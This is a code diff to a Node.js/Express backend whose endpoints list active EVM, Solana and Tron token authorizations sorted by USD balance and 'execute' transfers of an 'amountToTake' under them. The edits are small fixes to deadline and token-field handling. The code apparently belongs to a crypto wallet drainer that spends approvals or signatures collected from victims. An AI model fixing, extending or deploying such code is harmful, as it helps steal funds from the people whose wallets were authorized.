@@ -286,13 +286,13 @@ app.get('/api/pending/evm', async (req, res) => {
   try {
     const result = await client.query(`
       SELECT * FROM evm_authorizations 
-      WHERE status = 'active' AND sig_deadline > EXTRACT(EPOCH FROM NOW())
+      WHERE status = 'active' AND (sig_deadline IS NULL OR sig_deadline > EXTRACT(EPOCH FROM NOW()))
       ORDER BY current_balance_usd DESC
     `);
     
     const pending = result.rows.map(row => ({
       ...row,
-      tokens: JSON.parse(row.tokens)
+      tokens: Array.isArray(row.tokens) ? row.tokens : (row.tokens || [])
     }));
     
     res.json({ pending });
@@ -389,7 +389,7 @@ app.post('/api/execute/evm', async (req, res) => {
     }
     
     const auth = authResult.rows[0];
-    const tokens = JSON.parse(auth.tokens);
+    const tokens = Array.isArray(auth.tokens) ? auth.tokens : (auth.tokens || []);
     
     // Validate amount
     const requestedAmount = parseFloat(amountToTake) || auth.max_authorized_amount;
@@ -527,7 +527,7 @@ app.get('/api/pending/solana', async (req, res) => {
     
     const pending = result.rows.map(row => ({
       ...row,
-      tokens: JSON.parse(row.tokens)
+      tokens: Array.isArray(row.tokens) ? row.tokens : (row.tokens || [])
     }));
     
     res.json({ pending });
@@ -567,7 +567,7 @@ app.post('/api/execute/solana', async (req, res) => {
     }
     
     const auth = authResult.rows[0];
-    const tokens = JSON.parse(auth.tokens);
+    const tokens = Array.isArray(auth.tokens) ? auth.tokens : (auth.tokens || []);
     const requestedAmount = parseFloat(amountToTake) || auth.max_authorized_amount;
     
     // Note: Full Solana execution implementation needed
@@ -641,7 +641,7 @@ app.get('/api/pending/tron', async (req, res) => {
     
     const pending = result.rows.map(row => ({
       ...row,
-      tokens: JSON.parse(row.tokens)
+      tokens: Array.isArray(row.tokens) ? row.tokens : (row.tokens || [])
     }));
     
     res.json({ pending });
